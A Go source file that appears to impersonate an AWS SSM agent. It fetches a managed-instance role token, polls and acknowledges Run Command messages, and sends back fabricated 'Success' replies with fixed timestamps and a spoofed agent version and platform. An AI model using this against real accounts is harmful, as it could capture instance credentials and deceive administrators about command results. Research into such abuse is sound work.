package awsssm

import (
	"crypto/sha256"
	"encoding/json"
	"log"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/aws/amazon-ssm-agent/agent/contracts"
	"github.com/aws/amazon-ssm-agent/agent/times"
	"github.com/aws/amazon-ssm-agent/extra/aws-sdk-go/service/ssmmds"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/grines/ssmmm/awsauth"
	"github.com/grines/ssmmm/awsrsa"
)

type SendCommandPayload struct {
	Parameters              map[string]interface{}    `json:"Parameters"`
	DocumentContent         contracts.DocumentContent `json:"DocumentContent"`
	CommandID               string                    `json:"CommandId"`
	DocumentName            string                    `json:"DocumentName"`
	OutputS3KeyPrefix       string                    `json:"OutputS3KeyPrefix"`
	OutputS3BucketName      string                    `json:"OutputS3BucketName"`
	CloudWatchLogGroupName  string                    `json:"CloudWatchLogGroupName"`
	CloudWatchOutputEnabled string                    `json:"CloudWatchOutputEnabled"`
}

func createMDSMessage(commandID string, payload string, topic string, instanceID string) ssmmds.Message {
	messageCreatedDate := time.Date(2015, 7, 9, 23, 22, 39, 19000000, time.UTC)

	c := sha256.New()
	c.Write([]byte(payload))
	payloadDigest := string(c.Sum(nil))

	return ssmmds.Message{
		CreatedDate:   aws.String(times.ToIso8601UTC(messageCreatedDate)),
		Destination:   aws.String(instanceID),
		MessageId:     aws.String("aws.ssm." + commandID + "." + instanceID),
		Payload:       aws.String(payload),
		PayloadDigest: aws.String(payloadDigest),
		Topic:         aws.String(topic),
	}
}

func GetRoleTokenFromRSA(managedInstanceID string, publicKey string) awsrsa.AwsToken {
	signer := awsrsa.BuildRsaSigner(managedInstanceID, publicKey, "AmazonSSM.RequestManagedInstanceRoleToken", "ssm", "us-east-1", time.Now(), 0, `{"Fingerprint":"90312ec8-c247-47eb-823f-ad6e8ae1fff5"}`)
	signer.SignRsa()

	client := &http.Client{}
	resp, _ := client.Do(signer.Request)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.AwsToken
	err := decoder.Decode(&data)
	if err != nil {
	}
	return data
}

func GetRunCommandMessages(tokens awsrsa.AwsToken, managedInstanceID string) awsrsa.DocMessage {
	req, body := awsauth.BuildRequest("ec2messages", "us-east-1", `{"Destination":"`+managedInstanceID+`","MessagesRequestId":"`+awsrsa.UniqueID()+`","VisibilityTimeoutInSeconds":10}`, "EC2WindowsMessageDeliveryService.GetMessages")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", "us-east-1", 0, time.Now())

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return data
}

func SendCommandOutput(tokens awsrsa.AwsToken, managedInstanceID string, cmdID string, cmdOutput string) string {
	req, body := awsauth.BuildRequest("ec2messages", "us-east-1", `{"MessageId":"aws.ssm.`+cmdID+`.`+managedInstanceID+`","Payload":"{\"additionalInfo\":{\"agent\":{\"lang\":\"en-US\",\"name\":\"amazon-ssm-agent\",\"os\":\"\",\"osver\":\"1\",\"ver\":\"3.1.0.0\"},\"dateTime\":\"2022-01-13T00:30:25.818Z\",\"runId\":\"\",\"runtimeStatusCounts\":{\"Success\":1}},\"documentStatus\":\"Success\",\"documentTraceOutput\":\"\",\"runtimeStatus\":{\"aws:runShellScript\":{\"status\":\"Success\",\"code\":0,\"name\":\"aws:runShellScript\",\"output\":\"`+cmdOutput+`\\n\",\"startDateTime\":\"2022-01-13T00:30:25.268Z\",\"endDateTime\":\"2022-01-13T00:30:25.385Z\",\"outputS3BucketName\":\"\",\"outputS3KeyPrefix\":\"\",\"stepName\":\"\",\"standardOutput\":\"`+cmdOutput+`\\n\",\"standardError\":\"\"}}}","ReplyId":"`+awsrsa.UniqueID()+`"}`, "EC2WindowsMessageDeliveryService.SendReply")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", "us-east-1", 0, time.Now())

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"
}

func AcknowledgeCommand(tokens awsrsa.AwsToken, managedInstanceID string, cmdID string) string {
	req, body := awsauth.BuildRequest("ec2messages", "us-east-1", `{"MessageId":"aws.ssm.`+cmdID+`.`+managedInstanceID+`"}`, "EC2WindowsMessageDeliveryService.AcknowledgeMessage")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", "us-east-1", 0, time.Now())

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"

}

func GetOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func UpdateInstaceInformation(tokens awsrsa.AwsToken, managedInstanceID string) string {
	hostname, _ := os.Hostname()
	localip := GetLocalIP()

	req, body := awsauth.BuildRequest("ssm", "us-east-1", `{"AgentName":"amazon-ssm-agent","AgentStatus":"Active","AgentVersion":"3.1.0.0","ComputerName":"`+hostname+`","IPAddress":"`+localip+`","InstanceId":"`+managedInstanceID+`","PlatformName":"macOS","PlatformType":"MacOS","PlatformVersion":"11.6"}`, "AmazonSSM.UpdateInstanceInformation")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ssm", "us-east-1", 0, time.Now())

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"

}
